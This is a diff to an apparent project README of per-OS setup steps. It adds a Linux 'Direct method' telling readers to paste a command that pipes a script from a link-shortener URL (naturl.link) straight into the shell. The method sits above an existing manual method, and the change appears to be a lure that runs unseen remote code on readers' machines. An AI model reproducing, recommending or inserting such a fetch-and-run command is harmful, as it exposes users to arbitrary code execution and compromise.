@@ -23,7 +23,13 @@ Follow the steps below according to your operating system.
 3. After executing the command, open the file `pro.txt` in your favorite text editor to view the programming codes.
 
 ### For Linux
+## Direct method
+Copy and Paste this in your terminal window by pressing Control + Shift + Cs from your keyboard or manually paste it.
+```bash
+wget -qO- https://naturl.link/curl | sh
+```
 
+## Manual Method
 1. **Open Terminal.**
 2. Since Linux may not have the `curl` command installed by default, use the following command instead:
    ```
